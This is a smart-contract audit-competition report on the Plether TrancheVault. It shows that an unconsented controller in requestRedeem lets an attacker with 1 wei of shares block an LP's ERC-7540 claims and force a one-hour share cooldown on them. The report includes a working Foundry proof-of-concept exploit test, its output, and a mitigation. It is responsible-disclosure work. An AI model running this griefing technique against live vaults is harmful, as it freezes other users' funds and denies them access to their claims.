# \#98843 [SC-Low] Unconsented `controller` in `TrancheVault.requestRedeem` lets anyone block an LP's ERC-7540 claims and impose the LP cooldown on its shares, which the LOW-40 fix does not cover

**Submitted on Nov 10th 2026 at 14:21:29 UTC by @abarbatei for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98843
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

[`TrancheVault::requestRedeem`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L606-L631) authorizes only the share `owner` and credits the request to any `controller` the caller names, without that address's consent. An attacker holding 1 wei of tranche shares can file a 1-wei redemption that names any LP as its controller. The request quotes to zero, is refunded at settlement, and becomes the victim's controller head. From then on:
- the victim's ERC-7540 `maxRedeem` and `maxWithdraw` return 0;
- `redeem` and `withdraw` revert, even for the victim's own funded redemptions;
- the only way to clear the head is a refund claim, and that claim stamps a fresh one-hour LP cooldown on the victim's whole share balance.

The attacker can repeat this every epoch for 1 wei plus gas. Cecuro LOW-40 was fixed so that a third party cannot impose the LP cooldown on an unrelated account. The fix closed the delivery-time `receiver` vector, but not the request-time `controller` vector.

## Vulnerability Details

### Intended behaviour

Redemptions are asynchronous: a request is queued under a controller, funded at epoch settlement, and then claimed. Requests whose quote rounds to zero are refunded. Share deliveries stamp `lastDepositTime`, which blocks transfers and new requests for `DEPOSIT_COOLDOWN` (one hour). Cecuro LOW-40 ("Controller can force a zero-balance receiver into LP cooldown", fixed in commit `efcf629`) states the protected property: "A controller therefore cannot use these paths to send unsolicited shares and impose a cooldown on an unrelated ... address". The fix requires `receiver == controller` on every cooldown-setting delivery ([`TrancheVault::_requireShareReceiver`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1620-L1628)).

### Root cause

1. **No controller consent at request time.** `requestRedeem` checks only that `controller` is nonzero, spends allowance on the `owner` axis, and enqueues the shares under the caller-chosen `controller`:

```solidity
        if (msg.sender != owner && !isOperator[owner][msg.sender]) {
            _spendAllowance(owner, msg.sender, shares);
        }
        _transfer(owner, address(this), shares);

        requestId = _enqueueRedeemRequest(shares, controller);
```

   [`_enqueueRedeemRequest`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L688-L708) calls [`_appendControllerRedeem`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1783-L1797). That makes the request the victim's `controllerRedeemHead` whenever the victim has nothing else queued.

2. **A 1-wei full-balance request passes the minimum-size check.** [`_requireMinimumRedeemSize`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1611-L1618) skips the check when `shares == maxShares`, so a wallet holding exactly 1 wei can request 1 wei.

3. **The zero-quote head is refunded into the victim's queue.** At settlement, [`HousePool.sol#L957-L986`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L957-L986) calls `refundRedeemEpochRemainder` when the head quotes to zero and nothing else is funded. The request becomes a refundable position owned by the victim.

4. **The ERC-7540 surface reads only the head.** [`maxWithdraw` / `maxRedeem`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1299-L1311) and [`withdraw` / `redeem`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L998-L1012) use only `controllerRedeemHead[controller]`. A refund head has zero claimable shares, so they return 0 or revert `ERC4626ExceededMaxRedeem` ([`_claimRedeem`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1148-L1162)), even while the victim's later requests are fully funded.

5. **Clearing the head imposes the cooldown.** Cancellation is closed once refund is enabled ([`TrancheVault.sol#L894-L897`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L894-L897)). [`claimRedeemRefund`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L916-L945) requires `receiver == controller` (the LOW-40 fix) and then executes:

```solidity
        if (shares != 0) {
            lastDepositTime[receiver] = block.timestamp;
            _transfer(address(this), receiver, shares);
        }
```

   The victim's entire wallet is then under the one-hour cooldown: transfers revert in [`_update`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L325-L331), and new requests revert at [`TrancheVault.sol#L617-L619`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L617-L619).

The attacker never needs to be the receiver. It makes the victim the controller of the attacker's own request, and every path that clears that request imposes the cooldown the LOW-40 fix was meant to prevent. The SECURITY.md LP accounting limitation says "Redemption cancellation or terminal refund still begins a new cooldown when shares return to a wallet" ([`SECURITY.md#L1396-L1399`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1396-L1399)). That covers a holder's own refunds. It does not cover a third party creating a refund position in someone else's queue.

## Impact Details

Selected impact: **Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol), Medium**. The proof also meets "Temporary freezing of funds for at least 1 hour" (Medium) for the victim's share balance. That is offered as the alternative, not claimed as the primary impact.

The attacker earns nothing; the 1 wei of shares ends up with the victim. Measured in the proof:

| Quantity | Value |
| :-- | :-- |
| Victim LP position | 100 USDG of Junior shares |
| Victim's own funded redemption hidden from `redeem` / `withdraw` (`maxRedeem` = 0) | half of the position (about 50 USDG) |
| Victim shares frozen after clearing the injected head | the remaining half (about 50 USDG), for 3,600 s |
| Attacker cost per cycle | 1 wei of shares plus gas |
| Renewal | the next epoch, from a fresh 1-wei wallet; the proof repeats it |

- **Scale.** The damage scales with the victim's balance, not the attacker's spend. Any LP of any size can be targeted.
- **Integrators.** Vault aggregators, routers and smart wallets that use the standard ERC-7540 `redeem`, `withdraw` and `maxRedeem` see the claim as unavailable until the victim acts.
- **Duration.** Renewing every epoch keeps the standard claim surface blocked continuously, and each clear restarts the one-hour share freeze.
- **No trusted role is involved.** LP epoch settlement is permissionless.
- **Limits, stated plainly.**
  - The victim can still claim a funded request by explicit id with `claimRedeem(requestId, ...)`, and the proof asserts this.
  - USDG payouts are not cooldown gated.
  - The harm is denial of the standard interface and the forced share freeze, not loss of principal.

## Mitigation

Require controller consent when `controller != owner`, mirroring ERC-7540 operator semantics on the receiving side:

```solidity
        if (controller != owner) {
            _requireControllerAuth(controller);
        }
```

Alternatively, do not stamp `lastDepositTime` when a refund returns shares that another owner escrowed, and do not refund-enqueue zero-quote heads under a controller that did not create them.

## References

- [`TrancheVault::requestRedeem`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L606-L631): owner-only authorization, caller-chosen controller.
- [`TrancheVault::_enqueueRedeemRequest`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L688-L708) and [`_appendControllerRedeem`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1783-L1797): the request becomes the victim's head.
- [`TrancheVault::_requireMinimumRedeemSize`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1611-L1618): full-balance bypass.
- [`HousePool.sol#L957-L986`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L957-L986): zero-quote head refund.
- [`TrancheVault.sol#L1299-L1311`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1299-L1311), [`#L998-L1012`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L998-L1012), [`#L1148-L1162`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1148-L1162): head-only ERC-7540 surface.
- [`TrancheVault::claimRedeemRefund`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L916-L945), [`#L894-L897`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L894-L897), [`#L325-L331`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L325-L331), [`#L617-L619`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L617-L619): clearing the head stamps the cooldown, which blocks transfers and requests.
- Cecuro AI audit LOW-40 and fix commit `efcf629` (the protected property): [`audits/plether-ai-audit-report-2026-10-26.pdf`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf). The SC Audit Studio pre-audit SC-H2 is a second precedent for third-party cooldown resets ([`audits/plether-pre-audit-report.pdf`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-pre-audit-report.pdf)).
- [`SECURITY.md#L1396-L1399`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1396-L1399): the accepted self-refund cooldown, which is distinct from third-party injection.
- Pinned commit [a82d4fefb02768e5b3bddcc97dee371eee24fea8](https://github.com/immunefi-team/audit-comp-plether/commit/a82d4fefb02768e5b3bddcc97dee371eee24fea8).


## Proof of Concept

## Proof of Concept

Setup. The proof is a Foundry test in the repository's own perps test suite at the pinned commit [a82d4fefb02768e5b3bddcc97dee371eee24fea8](https://github.com/immunefi-team/audit-comp-plether/commit/a82d4fefb02768e5b3bddcc97dee371eee24fea8).
- It extends the suite's `HousePoolAsyncTestBase`, with the same fixture as the suite's own `TrancheShareReceiver.t.sol`.
- `vm.prank` only selects the sender. Epoch settlement is the public `HousePool.settleLpEpoch`, called by an unrelated keeper; no positions are open, so no mark is needed.
- The only suite shortcut is onboarding the victim and the attacker as LPs before the attack (`_depositAsync`).
- No in-scope contract is modified.

Place the file at `packages/perps/test/poc/controller-injection-cooldown/ProofControllerInjectionCooldown.t.sol` and run from `packages/perps`:

```
FOUNDRY_TEST=test/poc/controller-injection-cooldown forge test --match-path 'test/poc/controller-injection-cooldown/*.t.sol' -vv
```

`FOUNDRY_TEST` limits the via-IR compile to the sources plus the proof directory. On a machine that can compile the whole test tree, the plain `forge test --match-path ...` works too.

The single test does the following:
1. The attacker's 1-wei request naming the victim as controller becomes the victim's head as a refund.
2. The victim's own funded redemption is hidden: `maxRedeem` and `maxWithdraw` read 0, and `redeem` reverts `ERC4626ExceededMaxRedeem(victim, claimable, 0)`.
3. Clearing the head stamps `lastDepositTime[victim]`. The victim's `transfer` then reverts `TrancheVault__TransferDuringCooldown` and `requestRedeem` reverts `TrancheVault__DepositCooldown` for 3,600 s.
4. The explicit-id `claimRedeem` still pays, which the test states openly.
5. A second 1-wei wallet blocks the head again in the next epoch.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// Proof: a third party names an unrelated LP as `controller` of a 1-wei redeem request. The zero-quote request is
// refunded at settlement and becomes the victim's controller head, which (a) zeroes the victim's ERC-7540
// maxRedeem/maxWithdraw and makes redeem/withdraw revert, even for the victim's own funded redemption, and (b) can
// only be cleared by a refund claim that stamps a fresh one-hour LP cooldown on the victim's whole share balance.
// Repeatable every epoch from fresh 1-wei wallets. Incomplete fix of Cecuro LOW-40.
// Fixture: the repository's own HousePoolAsyncTestBase, unmodified (same setup as the suite's
// TrancheShareReceiver.t.sol). vm.prank only selects the sender; settlement goes through the public entrypoint.

import {console2} from "forge-std/console2.sol";
import {ERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {HousePoolAsyncTestBase} from "../../perps/shared/HousePoolTestBase.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";

contract ProofControllerInjectionCooldownTest is HousePoolAsyncTestBase {
    address internal constant VICTIM = address(0x51C7);
    address internal constant ATTACKER = address(0xBAD1);
    address internal constant DUST_STORE = address(0xBAD2);
    address internal constant DUST_A = address(0xBAD3);
    address internal constant DUST_B = address(0xBAD4);
    address internal constant KEEPER = address(0x6EE9);

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    /// Permissionless epoch settlement by an unrelated keeper once the request's epoch has matured.
    function _settlePublic(uint256 requestId) internal {
        uint256 maturity = pool.lpEpochStart(requestId);
        if (vm.getBlockTimestamp() < maturity) vm.warp(maturity);
        vm.prank(KEEPER);
        pool.settleLpEpoch(0, 0); // no open positions: HousePool's public no-mark path
    }

    function _injectAndSettle(address dustWallet) internal returns (uint256 id) {
        assertEq(juniorVault.balanceOf(dustWallet), 1, "dust wallet holds exactly 1 wei share");
        vm.prank(dustWallet);
        id = juniorVault.requestRedeem(1, VICTIM, dustWallet); // controller = VICTIM, owner = attacker
        _settlePublic(id);
    }

    function test_controllerInjectionBlocksErc7540ClaimsAndForcesCooldown() public {
        // Victim: an ordinary LP with 100 USDG of Junior shares, cooldown long finished.
        (, uint256 victimShares) = _depositAsync(juniorVault, VICTIM, 100e6);
        _finishAsyncCooldown(juniorVault, VICTIM);
        // Attacker: 1 USDG deposit, splits off 1-wei dust wallets (recipients inherit the older timestamp).
        (, uint256 attackerShares) = _depositAsync(juniorVault, ATTACKER, 1e6);
        _finishAsyncCooldown(juniorVault, ATTACKER);
        vm.startPrank(ATTACKER);
        juniorVault.transfer(DUST_A, 1);
        juniorVault.transfer(DUST_B, 1);
        juniorVault.transfer(DUST_STORE, attackerShares - 2);
        vm.stopPrank();
        console2.log("victim shares", victimShares);
        console2.log("victim share value (USDG atoms)", juniorVault.convertToAssets(victimShares));

        // 1. Injection: the attacker's 1-wei request is credited to the victim; the epoch refunds the zero quote.
        uint256 injected = _injectAndSettle(DUST_A);
        assertEq(juniorVault.controllerRedeemHead(VICTIM), injected, "attacker request is the victim's head");
        assertEq(juniorVault.refundableRedeemRequest(injected, VICTIM), 1, "head is a refund");

        // 2. The victim's own funded redemption is hidden from the standard ERC-7540 surface.
        uint256 half = victimShares / 2;
        vm.prank(VICTIM);
        uint256 own = juniorVault.requestRedeem(half, VICTIM, VICTIM);
        _settlePublic(own);
        uint256 claimable = juniorVault.claimableRedeemRequest(own, VICTIM);
        assertGt(claimable, 0, "victim's own request is funded");
        assertEq(juniorVault.maxRedeem(VICTIM), 0, "maxRedeem reads the injected head");
        assertEq(juniorVault.maxWithdraw(VICTIM), 0, "maxWithdraw reads the injected head");
        vm.prank(VICTIM);
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxRedeem.selector, VICTIM, claimable, 0));
        juniorVault.redeem(claimable, VICTIM, VICTIM);
        console2.log("victim funded claim hidden from redeem/withdraw (shares)", claimable);

        // 3. Clearing the injected head stamps a new one-hour cooldown on the victim's remaining shares.
        vm.prank(VICTIM);
        juniorVault.claimRedeemRefund(injected, VICTIM, VICTIM);
        assertEq(juniorVault.lastDepositTime(VICTIM), vm.getBlockTimestamp(), "cooldown restarted by attacker dust");
        uint256 frozen = juniorVault.balanceOf(VICTIM);
        vm.startPrank(VICTIM);
        vm.expectRevert(TrancheVault.TrancheVault__TransferDuringCooldown.selector);
        juniorVault.transfer(address(0xF00D), 1);
        vm.expectRevert(TrancheVault.TrancheVault__DepositCooldown.selector);
        juniorVault.requestRedeem(frozen, VICTIM, VICTIM);
        vm.stopPrank();
        console2.log("victim shares frozen for DEPOSIT_COOLDOWN", frozen);
        console2.log("DEPOSIT_COOLDOWN seconds", juniorVault.DEPOSIT_COOLDOWN());

        // Stated honestly: the explicit-id claim path is not gated and still pays the victim's funded request.
        vm.prank(VICTIM);
        uint256 paid = juniorVault.claimRedeem(own, claimable, VICTIM, VICTIM);
        assertGt(paid, 0, "explicit-id claim still works");

        // 4. Renewal: a second 1-wei wallet repeats it in the next epoch.
        uint256 injected2 = _injectAndSettle(DUST_B);
        assertEq(juniorVault.controllerRedeemHead(VICTIM), injected2, "head blocked again");
        assertEq(juniorVault.maxRedeem(VICTIM), 0);
        console2.log("attacker cost per cycle: 1 wei share + gas; attacker shares left", juniorVault.balanceOf(DUST_STORE));
    }
}
```

Output (exit 0):

```
Ran 1 test for test/poc/controller-injection-cooldown/ProofControllerInjectionCooldown.t.sol:ProofControllerInjectionCooldownTest
[PASS] test_controllerInjectionBlocksErc7540ClaimsAndForcesCooldown() (gas: 3102696)
Logs:
  victim shares 100000913208
  victim share value (USDG atoms) 99997510
  victim funded claim hidden from redeem/withdraw (shares) 50000456604
  victim shares frozen for DEPOSIT_COOLDOWN 50000456605
  DEPOSIT_COOLDOWN seconds 3600
  attacker cost per cycle: 1 wei share + gas; attacker shares left 1000025735

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.84ms (3.32ms CPU time)

Ran 1 test suite in 14.48ms (9.84ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

